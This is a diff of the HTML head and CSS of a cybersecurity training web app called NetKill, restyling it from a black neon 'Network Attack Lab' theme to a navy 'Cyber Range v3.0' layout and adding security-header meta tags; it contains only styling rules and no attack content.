@@ -3,623 +3,628 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NetKill — Network Attack Lab</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+<meta http-equiv="X-XSS-Protection" content="1; mode=block">
+<meta http-equiv="X-Content-Type-Options" content="nosniff">
+<meta http-equiv="X-Frame-Options" content="DENY">
+<meta name="referrer" content="no-referrer">
+<title>NetKill — Cyber Range v3.0</title>
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Roboto:wght@300;400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
-:root {
-  --bg:#000000; --bg2:#030303; --bg3:#080808;
-  --panel:#050505; --border:#111; --border2:#1a1a1a;
-  --neon-red:#ff0033; --neon-pink:#ff006e; --neon-orange:#ff6600;
-  --neon-amber:#ffcc00; --neon-green:#00ff41; --neon-cyan:#00ffff;
-  --neon-blue:#0066ff; --neon-purple:#cc00ff;
-  --text:#e0e0e0; --text2:#666; --text3:#2a2a2a;
-  --mono:'Share Tech Mono',monospace; --head:'Orbitron',sans-serif; --body:'Rajdhani',sans-serif;
+:root{
+  --bg:#0a1929;--bg2:#0d2137;--bg3:#112744;--bg4:#162f4f;
+  --border:#1e3a5f;--border2:#2a4f7c;
+  --cyan:#00ffff;--green:#00ff88;--red:#ff3055;--amber:#ffaa00;--purple:#c084fc;--blue:#4da6ff;
+  --text:#d0d0d0;--text2:#9ab0c8;--text3:#4a6f8a;
+  --fh:'Rajdhani',sans-serif;--fb:'Roboto',sans-serif;--fm:'JetBrains Mono',monospace;
 }
 *{margin:0;padding:0;box-sizing:border-box;}
-html,body{background:#000;color:var(--text);font-family:var(--body);min-height:100vh;overflow-x:hidden;}
-body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,65,0.012) 3px,rgba(0,255,65,0.012) 4px);pointer-events:none;z-index:9997;}
-header{position:relative;z-index:100;background:#000;border-bottom:1px solid #111;padding:0 1.5rem;}
-header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent 0%,var(--neon-red) 20%,var(--neon-orange) 50%,var(--neon-red) 80%,transparent 100%);animation:hline 4s ease-in-out infinite;}
-@keyframes hline{0%,100%{opacity:0.4}50%{opacity:1}}
-.header-inner{max-width:1500px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:0.9rem 0;}
-.logo{display:flex;align-items:center;gap:1rem;}
-.logo-skull{width:38px;height:38px;display:flex;align-items:center;justify-content:center;font-size:20px;position:relative;}
-.logo-skull::before{content:'';position:absolute;inset:-4px;border:1px solid var(--neon-red);clip-path:polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%);animation:sglow 2s ease-in-out infinite;}
-@keyframes sglow{0%,100%{filter:drop-shadow(0 0 4px var(--neon-red))}50%{filter:drop-shadow(0 0 14px var(--neon-red))}}
-.logo-text h1{font-family:var(--head);font-size:1.5rem;color:#fff;letter-spacing:0.15em;text-shadow:0 0 20px var(--neon-red),0 0 40px rgba(255,0,51,0.3);}
-.logo-text p{font-family:var(--mono);font-size:0.62rem;color:var(--neon-red);letter-spacing:0.22em;opacity:0.7;}
-.header-right{display:flex;align-items:center;gap:0.8rem;}
-.hbadge{font-family:var(--mono);font-size:0.65rem;padding:0.22rem 0.65rem;border:1px solid;letter-spacing:0.1em;cursor:pointer;transition:all 0.2s;}
-.hbg{border-color:var(--neon-green);color:var(--neon-green);}
-.hba{border-color:var(--neon-amber);color:var(--neon-amber);}
-.hba:hover{background:rgba(255,204,0,0.08);}
-.sdot{display:inline-block;width:5px;height:5px;background:var(--neon-green);border-radius:50%;margin-right:0.35rem;box-shadow:0 0 6px var(--neon-green);animation:blink 1.2s step-end infinite;}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
-.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.93);z-index:2000;align-items:center;justify-content:center;backdrop-filter:blur(4px);}
-.modal-overlay.active{display:flex;}
-.modal{background:#000;border:1px solid var(--neon-amber);max-width:520px;width:90%;padding:2rem;box-shadow:0 0 50px rgba(255,204,0,0.12);position:relative;}
-.modal::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--neon-amber),transparent);}
-.modal h2{font-family:var(--head);font-size:0.85rem;color:var(--neon-amber);letter-spacing:0.15em;margin-bottom:1rem;}
-.modal p{font-size:0.88rem;color:#666;line-height:1.8;margin-bottom:0.7rem;}
-.modal p strong{color:#bbb;}
-.modal p.warn{color:var(--neon-amber);}
-.modal-close{margin-top:1.2rem;font-family:var(--head);font-size:0.72rem;letter-spacing:0.15em;padding:0.55rem 1.8rem;background:var(--neon-amber);color:#000;border:none;cursor:pointer;transition:all 0.2s;}
-.modal-close:hover{box-shadow:0 0 20px var(--neon-amber);}
-.main{position:relative;z-index:1;max-width:1500px;margin:0 auto;padding:1.1rem;display:grid;grid-template-columns:255px 1fr 295px;gap:1.1rem;min-height:calc(100vh - 68px);}
-.panel{background:var(--panel);border:1px solid var(--border2);position:relative;overflow:hidden;}
-.panel-header{padding:0.6rem 0.9rem;border-bottom:1px solid var(--border2);display:flex;align-items:center;gap:0.5rem;background:rgba(255,255,255,0.015);}
-.panel-header h3{font-family:var(--mono);font-size:0.6rem;letter-spacing:0.2em;text-transform:uppercase;}
-.ph-red h3{color:var(--neon-red);} .ph-green h3{color:var(--neon-green);} .ph-cyan h3{color:var(--neon-cyan);}
-.ph-amber h3{color:var(--neon-amber);} .ph-purple h3{color:var(--neon-purple);} .ph-orange h3{color:var(--neon-orange);}
-.pdot{width:5px;height:5px;border-radius:50%;flex-shrink:0;}
-.pd-r{background:var(--neon-red);box-shadow:0 0 6px var(--neon-red);}
-.pd-g{background:var(--neon-green);box-shadow:0 0 6px var(--neon-green);}
-.pd-c{background:var(--neon-cyan);box-shadow:0 0 6px var(--neon-cyan);}
-.pd-a{background:var(--neon-amber);box-shadow:0 0 6px var(--neon-amber);}
-.pd-o{background:var(--neon-orange);box-shadow:0 0 6px var(--neon-orange);}
-.attack-list{padding:0.4rem;}
-.attack-item{padding:0.7rem 0.75rem;cursor:pointer;border:1px solid transparent;margin-bottom:0.2rem;transition:all 0.15s;position:relative;}
-.attack-item:hover{border-color:#1a1a1a;background:rgba(255,255,255,0.025);}
-.attack-item.active{border-color:var(--neon-red);background:rgba(255,0,51,0.05);}
-.attack-item.active::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:var(--neon-red);box-shadow:0 0 8px var(--neon-red);}
-.atk-name{font-family:var(--body);font-weight:700;font-size:0.92rem;color:#bbb;margin-bottom:0.1rem;transition:color 0.15s;}
-.attack-item.active .atk-name{color:var(--neon-red);text-shadow:0 0 8px rgba(255,0,51,0.4);}
-.attack-item:hover .atk-name{color:#fff;}
-.atk-sub{font-size:0.68rem;color:var(--text3);font-family:var(--mono);margin-bottom:0.35rem;}
-.attack-item.active .atk-sub{color:rgba(255,0,51,0.4);}
-.tags{display:flex;gap:0.25rem;flex-wrap:wrap;}
-.tag{font-family:var(--mono);font-size:0.56rem;padding:0.1rem 0.35rem;border:1px solid;letter-spacing:0.05em;}
-.tl{border-color:rgba(0,255,255,0.25);color:var(--neon-cyan);}
-.ti{border-color:rgba(255,0,51,0.25);color:var(--neon-red);}
-.ts{border-color:rgba(0,255,65,0.25);color:var(--neon-green);}
-.center{display:flex;flex-direction:column;gap:1.1rem;}
-.canvas-wrap{background:#000;height:230px;position:relative;overflow:hidden;}
-.canvas-wrap::before,.canvas-wrap::after{content:'';position:absolute;width:16px;height:16px;border-color:var(--neon-red);border-style:solid;z-index:10;opacity:0.5;}
-.canvas-wrap::before{top:6px;left:6px;border-width:1px 0 0 1px;}
-.canvas-wrap::after{bottom:6px;right:6px;border-width:0 1px 1px 0;}
-canvas#nc{width:100%;height:100%;display:block;}
-.cv-label{position:absolute;bottom:7px;left:50%;transform:translateX(-50%);font-family:var(--mono);font-size:0.58rem;color:#222;letter-spacing:0.15em;white-space:nowrap;z-index:10;}
-.lab-ctrl{padding:0.7rem 0.9rem;border-top:1px solid var(--border2);display:flex;align-items:center;gap:0.7rem;background:rgba(255,0,51,0.02);}
-.btn-launch{font-family:var(--head);font-size:0.68rem;letter-spacing:0.12em;padding:0.45rem 1.1rem;background:var(--neon-red);color:#000;border:none;cursor:pointer;text-transform:uppercase;transition:all 0.2s;position:relative;overflow:hidden;white-space:nowrap;flex-shrink:0;}
-.btn-launch::before{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent);transform:translateX(-100%);transition:transform 0.4s;}
-.btn-launch:hover::before{transform:translateX(100%);}
-.btn-launch:hover{box-shadow:0 0 20px var(--neon-red),0 0 40px rgba(255,0,51,0.3);}
-.btn-launch:disabled{opacity:0.2;cursor:not-allowed;box-shadow:none;}
-.btn-reset{font-family:var(--mono);font-size:0.62rem;padding:0.42rem 0.75rem;background:transparent;color:#333;border:1px solid #1a1a1a;cursor:pointer;transition:all 0.2s;white-space:nowrap;flex-shrink:0;}
-.btn-reset:hover{border-color:#333;color:#666;}
-.prog-bar{flex:1;height:2px;background:#111;overflow:hidden;}
-.prog-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--neon-red),var(--neon-orange),var(--neon-amber));transition:width 0.2s;box-shadow:0 0 6px var(--neon-red);}
-.prog-pct{font-family:var(--mono);font-size:0.6rem;color:#333;white-space:nowrap;flex-shrink:0;}
-.pkt-display{padding:0.75rem 0.9rem;font-family:var(--mono);font-size:0.65rem;line-height:2;min-height:80px;background:#000;}
-.pkt-layer{color:var(--neon-orange);font-weight:bold;}
-.pkt-field{color:#333;}
-.pkt-val{color:var(--neon-green);}
-.pkt-empty{color:#1a1a1a;font-size:0.63rem;padding:1rem;text-align:center;}
-.chain-body{padding:0.9rem;overflow-y:auto;}
-.phase{margin-bottom:0.9rem;opacity:0.15;transition:opacity 0.5s,transform 0.4s;transform:translateX(-4px);}
-.phase.active{opacity:1;transform:translateX(0);}
-.phase.done{opacity:0.4;transform:translateX(0);}
-.phase-label{font-family:var(--mono);font-size:0.58rem;color:var(--neon-orange);letter-spacing:0.18em;margin-bottom:0.5rem;display:flex;align-items:center;gap:0.5rem;}
-.phase-label::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--neon-orange),transparent);opacity:0.25;}
-.step{display:flex;gap:0.7rem;padding:0.45rem 0;border-bottom:1px solid rgba(255,255,255,0.03);align-items:flex-start;transition:background 0.15s;}
-.step:hover{background:rgba(255,255,255,0.02);}
-.step-n{font-family:var(--mono);font-size:0.58rem;color:#222;width:16px;flex-shrink:0;padding-top:2px;}
-.step-t{font-weight:700;font-size:0.86rem;color:#ccc;margin-bottom:0.12rem;}
-.step-d{font-size:0.76rem;color:#444;line-height:1.5;}
-.step-cmd{margin-top:0.35rem;font-family:var(--mono);font-size:0.62rem;color:var(--neon-green);background:rgba(0,255,65,0.04);border-left:2px solid rgba(0,255,65,0.4);padding:0.35rem 0.55rem;white-space:pre-wrap;cursor:pointer;position:relative;transition:background 0.15s;}
-.step-cmd:hover{background:rgba(0,255,65,0.08);}
-.step-cmd::after{content:'COPY';position:absolute;top:0.25rem;right:0.45rem;font-size:0.52rem;color:#222;letter-spacing:0.1em;}
-.step-cmd.copied{border-color:var(--neon-cyan);color:var(--neon-cyan);}
-.step-cmd.copied::after{content:'✓ COPIED';color:var(--neon-cyan);}
-.right{display:flex;flex-direction:column;gap:1.1rem;}
-.score-grid{display:grid;grid-template-columns:1fr 1fr;gap:0.5rem;padding:0.7rem;}
-.sc{background:#000;border:1px solid #111;padding:0.65rem;text-align:center;transition:border-color 0.3s;cursor:default;}
-.sc:hover{border-color:#1a1a1a;}
-.sc-l{font-family:var(--mono);font-size:0.52rem;letter-spacing:0.12em;text-transform:uppercase;color:#222;margin-bottom:0.25rem;}
-.sc-v{font-family:var(--head);font-size:1.25rem;font-weight:900;transition:all 0.3s;}
-.sc-v.red{color:var(--neon-red);text-shadow:0 0 12px var(--neon-red);}
-.sc-v.green{color:var(--neon-green);text-shadow:0 0 12px var(--neon-green);}
-.sc-v.amber{color:var(--neon-amber);text-shadow:0 0 12px var(--neon-amber);}
-.sc-v.cyan{color:var(--neon-cyan);text-shadow:0 0 12px var(--neon-cyan);}
-.mitre-body{padding:0.7rem;}
-.mitre-tac{font-family:var(--mono);font-size:0.56rem;color:#222;letter-spacing:0.15em;margin:0.6rem 0 0.35rem;text-transform:uppercase;}
-.mitre-tac:first-child{margin-top:0;}
-.mitre-tag{display:inline-block;font-family:var(--mono);font-size:0.58rem;padding:0.18rem 0.45rem;margin:0.12rem;border:1px solid rgba(0,255,255,0.15);color:rgba(0,255,255,0.6);background:rgba(0,255,255,0.02);cursor:pointer;transition:all 0.15s;}
-.mitre-tag:hover{background:rgba(0,255,255,0.08);border-color:var(--neon-cyan);color:var(--neon-cyan);box-shadow:0 0 8px rgba(0,255,255,0.2);}
-.tool-body{padding:0.4rem 0.7rem 0.7rem;}
-.tool{display:flex;align-items:center;gap:0.6rem;padding:0.45rem 0;border-bottom:1px solid rgba(255,255,255,0.03);cursor:pointer;transition:background 0.15s;}
-.tool:hover{background:rgba(255,255,255,0.02);}
-.tool-ico{font-size:0.95rem;width:22px;text-align:center;flex-shrink:0;}
-.tool-n{font-weight:700;font-size:0.82rem;color:#999;}
-.tool-u{font-family:var(--mono);font-size:0.58rem;color:#2a2a2a;}
-.log-body{padding:0.4rem 0.7rem 0.7rem;max-height:190px;overflow-y:auto;}
-.log-e{font-family:var(--mono);font-size:0.6rem;padding:0.3rem 0.45rem;margin-bottom:0.2rem;border-left:2px solid;animation:fadeIn 0.4s ease;}
-@keyframes fadeIn{from{opacity:0;transform:translateX(-5px)}to{opacity:1;transform:translateX(0)}}
-.log-e.warn{border-color:var(--neon-amber);color:rgba(255,204,0,0.65);background:rgba(255,204,0,0.02);}
-.log-e.alert{border-color:var(--neon-red);color:rgba(255,0,51,0.75);background:rgba(255,0,51,0.02);}
-.log-e.info{border-color:#1a1a1a;color:#2a2a2a;background:transparent;}
-.log-e.stealth{border-color:var(--neon-green);color:rgba(0,255,65,0.65);background:rgba(0,255,65,0.02);}
-footer{position:relative;z-index:1;background:#000;border-top:1px solid #111;padding:0.45rem 1.5rem;display:flex;align-items:center;justify-content:space-between;}
-footer span{font-family:var(--mono);font-size:0.58rem;color:#1a1a1a;}
-footer .fl{color:rgba(255,204,0,0.3);}
-.welcome{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem;text-align:center;gap:0.7rem;min-height:150px;}
-.w-arrow{font-family:var(--mono);font-size:1.2rem;color:#111;animation:arr 2s ease-in-out infinite;}
-@keyframes arr{0%,100%{opacity:0.3;transform:translateX(0)}50%{opacity:0.7;transform:translateX(-5px)}}
-.welcome h2{font-family:var(--head);font-size:0.78rem;color:#1a1a1a;letter-spacing:0.25em;}
-.welcome p{font-size:0.76rem;color:#111;max-width:240px;line-height:1.6;}
-::-webkit-scrollbar{width:2px;}
-::-webkit-scrollbar-track{background:#000;}
-::-webkit-scrollbar-thumb{background:#111;}
-@media(max-width:1100px){.main{grid-template-columns:230px 1fr;}.right{display:none;}}
-@media(max-width:680px){.main{grid-template-columns:1fr;padding:0.7rem;}}
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--fb);font-size:14px;overflow-x:hidden;}
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--bg2);}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px;}
+body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,255,.007) 3px,rgba(0,255,255,.007) 4px);pointer-events:none;z-index:9999;}
+#topbar{position:fixed;top:0;left:0;right:0;height:58px;background:rgba(10,25,41,.97);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 24px;gap:6px;z-index:1000;backdrop-filter:blur(16px);}
+.logo{display:flex;align-items:center;gap:10px;margin-right:16px;cursor:pointer;}
+.logo-icon{width:34px;height:34px;background:linear-gradient(135deg,var(--cyan),var(--blue));border-radius:6px;display:flex;align-items:center;justify-content:center;font-family:var(--fh);font-weight:700;color:#0a1929;font-size:15px;flex-shrink:0;}
+.logo-name{font-family:var(--fh);font-size:20px;font-weight:700;letter-spacing:3px;color:#fff;}
+.logo-name span{color:var(--cyan);}
+.logo-ver{font-size:9px;color:var(--text3);letter-spacing:1px;}
+.nav-btn{padding:6px 13px;background:transparent;border:1px solid transparent;color:var(--text2);cursor:pointer;font-family:var(--fh);font-size:13px;letter-spacing:1px;border-radius:4px;transition:all .2s;text-transform:uppercase;}
+.nav-btn:hover{color:var(--cyan);border-color:var(--border2);}
+.nav-btn.active{color:var(--cyan);border-color:var(--cyan);background:rgba(0,255,255,.07);}
+.topbar-right{margin-left:auto;display:flex;align-items:center;gap:12px;}
+.rank-pill{padding:4px 12px;background:rgba(0,255,255,.08);border:1px solid rgba(0,255,255,.3);color:var(--cyan);font-family:var(--fh);font-size:12px;border-radius:3px;letter-spacing:2px;}
+.xp-wrap{display:flex;align-items:center;gap:8px;}
+.xp-bar{width:90px;height:4px;background:var(--border);border-radius:2px;overflow:hidden;}
+.xp-fill{height:100%;background:linear-gradient(90deg,var(--cyan),var(--blue));transition:width .5s;}
+.xp-lbl{font-size:11px;color:var(--text3);}
+.live-dot{display:flex;align-items:center;gap:5px;padding:4px 10px;background:rgba(255,48,85,.08);border:1px solid rgba(255,48,85,.25);border-radius:4px;}
+.live-dot span{width:6px;height:6px;background:var(--red);border-radius:50%;animation:blink 1.4s infinite;}
+.live-dot label{font-size:10px;color:var(--red);letter-spacing:1px;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
+#app{padding-top:58px;min-height:100vh;}
+.view{display:none;padding:28px 32px;max-width:1400px;margin:0 auto;}
+.view.active{display:block;}
+.sec-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:22px;}
+.sec-title{font-family:var(--fh);font-size:18px;font-weight:700;color:#fff;letter-spacing:3px;text-transform:uppercase;display:flex;align-items:center;gap:10px;}
+.sec-title::before{content:'';width:3px;height:20px;background:var(--cyan);border-radius:2px;display:inline-block;}
+.sec-sub{font-size:11px;color:var(--text3);letter-spacing:1px;}
+.stat-row{display:grid;grid-template-columns:repeat(5,1fr);gap:16px;margin-bottom:22px;}
+.stat-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;position:relative;overflow:hidden;}
+.stat-card::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;}
+.sc-c::after{background:linear-gradient(90deg,var(--cyan),transparent);}
+.sc-g::after{background:linear-gradient(90deg,var(--green),transparent);}
+.sc-a::after{background:linear-gradient(90deg,var(--amber),transparent);}
+.sc-r::after{background:linear-gradient(90deg,var(--red),transparent);}
+.stat-lbl{font-size:10px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:10px;}
+.stat-val{font-family:var(--fh);font-size:36px;font-weight:700;color:#fff;line-height:1;}
+.stat-note{font-size:11px;color:var(--text2);margin-top:6px;}
+.stat-ico{position:absolute;right:18px;top:50%;transform:translateY(-50%);font-size:38px;opacity:.07;}
+.xp-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;margin-bottom:22px;}
+.xp-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;}
+.xp-level{font-family:var(--fh);font-size:22px;font-weight:700;color:#fff;}
+.xp-next{font-size:12px;color:var(--text2);}
+.xp-main{height:8px;background:var(--border);border-radius:4px;overflow:hidden;}
+.xp-main-fill{height:100%;background:linear-gradient(90deg,var(--cyan),var(--blue));transition:width .6s;}
+.dash-panels{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+.panel{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;}
+.panel-title{font-size:10px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--border);}
+.act-item{display:flex;gap:10px;padding:9px 0;border-bottom:1px solid var(--border);}
+.act-item:last-child{border-bottom:none;}
+.act-dot{width:7px;height:7px;border-radius:50%;margin-top:4px;flex-shrink:0;}
+.act-text{font-size:12px;color:var(--text);}
+.act-time{font-size:10px;color:var(--text3);margin-top:2px;}
+.quick-row{display:flex;align-items:center;justify-content:space-between;padding:9px 12px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;margin-bottom:7px;cursor:pointer;transition:all .2s;}
+.quick-row:hover{border-color:var(--cyan);background:rgba(0,255,255,.04);}
+.qr-name{font-size:12px;color:var(--text);}
+.filter-row{display:flex;gap:8px;margin-bottom:18px;flex-wrap:wrap;align-items:center;}
+.f-btn{padding:5px 12px;background:var(--bg2);border:1px solid var(--border);color:var(--text2);font-family:var(--fh);font-size:11px;cursor:pointer;border-radius:3px;transition:all .2s;letter-spacing:1px;}
+.f-btn:hover,.f-btn.on{border-color:var(--cyan);color:var(--cyan);background:rgba(0,255,255,.06);}
+.s-input{background:var(--bg2);border:1px solid var(--border);color:var(--text);padding:6px 12px;font-family:var(--fm);font-size:12px;border-radius:4px;outline:none;width:210px;}
+.s-input:focus{border-color:var(--cyan);}
+.scen-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(310px,1fr));gap:14px;}
+.sc-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:18px;cursor:pointer;transition:all .25s;position:relative;overflow:hidden;}
+.sc-card:hover{border-color:var(--cyan);transform:translateY(-2px);box-shadow:0 8px 32px rgba(0,255,255,.07);}
+.sc-card.done{border-color:rgba(0,255,136,.3);}
+.sc-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;}
+.sc-id{font-size:10px;color:var(--text3);font-family:var(--fm);}
+.sc-badge{font-size:9px;padding:2px 7px;background:rgba(0,255,136,.1);border:1px solid var(--green);color:var(--green);border-radius:2px;letter-spacing:1px;}
+.sc-name{font-family:var(--fh);font-size:15px;font-weight:700;color:#fff;margin-bottom:6px;line-height:1.3;}
+.sc-desc{font-size:11px;color:var(--text2);line-height:1.55;margin-bottom:12px;}
+.sc-tags{display:flex;gap:6px;flex-wrap:wrap;}
+.tag{font-size:9px;padding:2px 8px;border-radius:2px;letter-spacing:1px;text-transform:uppercase;}
+.tag-t{background:rgba(0,255,255,.08);border:1px solid rgba(0,255,255,.25);color:var(--cyan);}
+.tag-tool{background:rgba(192,132,252,.08);border:1px solid rgba(192,132,252,.25);color:var(--purple);}
+.sc-foot{display:flex;justify-content:space-between;align-items:center;margin-top:12px;padding-top:10px;border-top:1px solid var(--border);}
+.stars{letter-spacing:2px;font-size:12px;}
+.d1{color:var(--green);}.d2{color:#66ff99;}.d3{color:var(--amber);}.d4{color:#ff8855;}.d5{color:var(--red);}
+.dur{font-size:10px;color:var(--text3);font-family:var(--fm);}
+.sc-bar{position:absolute;bottom:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--cyan),transparent);opacity:0;transition:.2s;}
+.sc-card:hover .sc-bar{opacity:1;}
+.back-btn{display:inline-flex;align-items:center;gap:8px;padding:6px 14px;background:var(--bg2);border:1px solid var(--border);color:var(--text2);cursor:pointer;font-family:var(--fh);font-size:12px;border-radius:4px;margin-bottom:20px;transition:all .2s;letter-spacing:1px;}
+.back-btn:hover{border-color:var(--cyan);color:var(--cyan);}
+.det-hdr{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:24px;margin-bottom:18px;}
+.det-title{font-family:var(--fh);font-size:24px;font-weight:700;color:#fff;margin-bottom:8px;}
+.det-meta{display:flex;gap:12px;flex-wrap:wrap;align-items:center;margin-bottom:12px;}
+.det-desc{font-size:13px;color:var(--text2);line-height:1.65;}
+.det-grid{display:grid;grid-template-columns:1fr 310px;gap:16px;}
+.kc-panel{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;}
+.kc-lbl{font-size:10px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:14px;}
+.kc-step{background:var(--bg3);border:1px solid var(--border);border-radius:6px;margin-bottom:8px;overflow:hidden;}
+.kc-hdr{padding:11px 14px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:.2s;}
+.kc-hdr:hover{background:rgba(0,255,255,.04);}
+.kc-num{width:24px;height:24px;background:var(--border2);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;color:var(--text2);flex-shrink:0;font-family:var(--fm);}
+.kc-step.open .kc-num{background:var(--cyan);color:#0a1929;}
+.kc-sname{font-size:12px;color:var(--text);flex:1;font-family:var(--fh);letter-spacing:.5px;}
+.kc-step.open .kc-sname{color:var(--cyan);}
+.kc-tid{font-size:10px;color:var(--text3);font-family:var(--fm);}
+.kc-body{padding:0 14px 14px;display:none;}
+.kc-step.open .kc-body{display:block;}
+.kc-sdesc{font-size:12px;color:var(--text2);line-height:1.55;margin-bottom:10px;}
+.term{background:#060e1a;border:1px solid var(--border2);border-radius:6px;padding:14px;font-size:11px;}
+.term-bar{display:flex;gap:6px;margin-bottom:10px;align-items:center;}
+.td{width:10px;height:10px;border-radius:50%;}
+.td-r{background:#ff5f56;}.td-y{background:#ffbd2e;}.td-g{background:#27c93f;}
+.term-ttl{font-size:10px;color:var(--text3);margin-left:6px;font-family:var(--fm);}
+.term-body{line-height:1.9;font-family:var(--fm);}
+.t-prompt{color:var(--cyan);}.t-cmd{color:#e8e8e8;}.t-out{color:var(--text2);}.t-cmt{color:var(--text3);}
+.side-col{display:flex;flex-direction:column;gap:14px;}
+.info-box{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:16px;}
+.ib-title{font-size:10px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;}
+.mit-row{display:flex;align-items:center;gap:8px;padding:7px 0;border-bottom:1px solid var(--border);}
+.mit-row:last-child{border-bottom:none;}
+.mit-id{font-size:10px;padding:2px 7px;background:rgba(0,255,255,.08);border:1px solid rgba(0,255,255,.2);color:var(--cyan);border-radius:2px;white-space:nowrap;font-family:var(--fm);}
+.mit-name{font-size:11px;color:var(--text);}
+.tchip{display:inline-flex;padding:3px 10px;background:rgba(192,132,252,.08);border:1px solid rgba(192,132,252,.2);color:var(--purple);font-size:10px;border-radius:3px;margin:3px;font-family:var(--fm);}
+.def-row{display:flex;align-items:flex-start;gap:8px;padding:6px 0;border-bottom:1px solid var(--border);font-size:11px;color:var(--text2);}
+.def-row:last-child{border-bottom:none;}
+.def-row::before{content:'◆';color:var(--amber);font-size:8px;margin-top:3px;flex-shrink:0;}
+.done-btn{width:100%;padding:12px;background:rgba(0,255,255,.07);border:1px solid var(--cyan);color:var(--cyan);font-family:var(--fh);font-size:13px;letter-spacing:2px;cursor:pointer;border-radius:6px;text-transform:uppercase;transition:all .2s;}
+.done-btn:hover{background:rgba(0,255,255,.14);}
+.done-btn.cleared{background:rgba(0,255,136,.1);border-color:var(--green);color:var(--green);}
+.arena-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:14px;}
+.ch-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;cursor:pointer;transition:all .25s;}
+.ch-card:hover{border-color:var(--amber);box-shadow:0 6px 24px rgba(255,170,0,.08);}
+.ch-card.solved{border-color:rgba(0,255,136,.3);}
+.ch-type{font-size:9px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;font-family:var(--fh);}
+.ch-type.siem{color:var(--cyan);}.ch-type.forensics{color:var(--purple);}.ch-type.network{color:var(--amber);}.ch-type.ir{color:var(--red);}.ch-type.detection{color:var(--green);}
+.ch-name{font-family:var(--fh);font-size:15px;font-weight:700;color:#fff;margin-bottom:6px;}
+.ch-desc{font-size:11px;color:var(--text2);line-height:1.5;margin-bottom:14px;}
+.ch-foot{display:flex;justify-content:space-between;align-items:center;}
+.ch-pts{font-size:13px;color:var(--amber);font-family:var(--fh);}
+.ir-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:14px;margin-bottom:24px;}
+.ir-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:18px;cursor:pointer;transition:all .25s;}
+.ir-card:hover{border-color:var(--blue);box-shadow:0 6px 24px rgba(77,166,255,.08);}
+.ir-ph{font-size:9px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;color:var(--blue);font-family:var(--fh);}
+.ir-name{font-family:var(--fh);font-size:15px;font-weight:700;color:#fff;margin-bottom:6px;}
+.ir-desc{font-size:11px;color:var(--text2);line-height:1.5;margin-bottom:12px;}
+.ir-foot{display:flex;justify-content:space-between;align-items:center;margin-top:12px;padding-top:10px;border-top:1px solid var(--border);}
+.ir-prog{font-size:10px;color:var(--text3);font-family:var(--fm);}
+.ir-pbar{flex:1;height:3px;background:var(--border);border-radius:2px;overflow:hidden;margin:0 8px;}
+.ir-pfill{height:100%;background:var(--blue);transition:width .4s;}
+.sm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(215px,1fr));gap:12px;}
+.sk-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:16px;}
+.sk-tactic{font-size:10px;letter-spacing:2px;text-transform:uppercase;margin-bottom:7px;font-family:var(--fh);}
+.sk-name{font-family:var(--fh);font-size:14px;font-weight:700;color:#fff;margin-bottom:10px;}
+.sk-bar-row{display:flex;align-items:center;gap:8px;margin-bottom:7px;}
+.sk-bar{flex:1;height:4px;background:var(--border);border-radius:2px;overflow:hidden;}
